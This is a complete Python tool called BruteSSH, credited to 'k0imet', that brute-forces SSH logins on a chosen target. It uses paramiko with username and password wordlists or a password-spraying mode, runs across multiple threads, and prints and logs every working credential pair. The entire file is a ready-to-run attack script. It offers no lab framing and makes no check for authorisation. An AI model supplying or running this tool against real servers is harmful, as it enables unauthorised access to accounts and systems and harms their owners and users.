#!/usr/bin/python3

## Author -- k0imet
import argparse
import paramiko
import concurrent.futures
import logging
import threading
import pyfiglet
from colorama import init, Fore, Style
from tqdm import tqdm

# Initialize colorama and logging
init(autoreset=True)
logging.basicConfig(filename='brutessh.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Function to attempt SSH login
def ssh_login(hostname, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname, port=port, username=username, password=password, timeout=5)
        success_message = f"Successful login - Username: {username}, Password: {password}"
        print(f"{Fore.GREEN}{success_message}{Style.RESET_ALL}")
        logging.info(success_message)
        client.close()
        return True
    except paramiko.AuthenticationException:
        logging.info(f"Failed login - Username: {username}, Password: {password}")
    except paramiko.SSHException as e:
        logging.error(f"SSH Error: {str(e)}")
    finally:
        client.close()
    return False

# Function to run the wordlist attack or password spraying
def ssh_attack(hostname, port, username_list, password_list, progress_bar, mode="wordlist"):
    if mode == "spray":
        # Password spraying: iterate through usernames, same password
        for password in password_list:
            for username in username_list:
                if ssh_login(hostname, port, username, password):
                    return  # Stop if login is successful
                progress_bar.update(1)
    else:
        # Traditional wordlist attack
        for username in username_list:
            for password in password_list:
                if ssh_login(hostname, port, username, password):
                    return  # Stop if login is successful
                progress_bar.update(1)

# Function to parse arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="SSH wordlist attack tool")
    parser.add_argument("-t", "--target-host", required=True, help="Target host")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("-U", "--username-list", help="Path to username list file or a single username")
    parser.add_argument("-u", "--username", help="Specify a single username")
    parser.add_argument("-P", "--password-list", required=True, help="Path to password list file")
    parser.add_argument("-T", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--mode", choices=["wordlist", "spray"], default="wordlist", help="Mode: 'wordlist' or 'spray' (default: wordlist)")
    return parser.parse_args()

# Function to read wordlists
def read_wordlist(file_path):
    with open(file_path, "r") as file:
        return file.read().splitlines()

# Function to display banner
def print_banner():
    banner = pyfiglet.figlet_format("BruteSSH")
    print(f"{Fore.YELLOW}{banner}{Style.RESET_ALL}")

if __name__ == "__main__":
    print_banner()

    args = parse_arguments()

    host = args.target_host
    port = args.port
    mode = args.mode

    # Handle username input: either a single username or a list
    if args.username:
        username_list = [args.username]
    elif args.username_list:
        username_list = read_wordlist(args.username_list)
    else:
        raise ValueError("You must provide either a single username (-u) or a username list (-U)")

    password_list = read_wordlist(args.password_list)

    total_combinations = len(username_list) * len(password_list)
    progress_bar = tqdm(total=total_combinations, desc="Progress", unit="attempts")

    # Using ThreadPoolExecutor for improved thread management
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [
            executor.submit(ssh_attack, host, port, username_list[i::args.threads], password_list, progress_bar, mode)
            for i in range(args.threads)
        ]
        for future in concurrent.futures.as_completed(futures):
            if future.result():  # If a thread found the correct login, stop all
                break

    progress_bar.close()
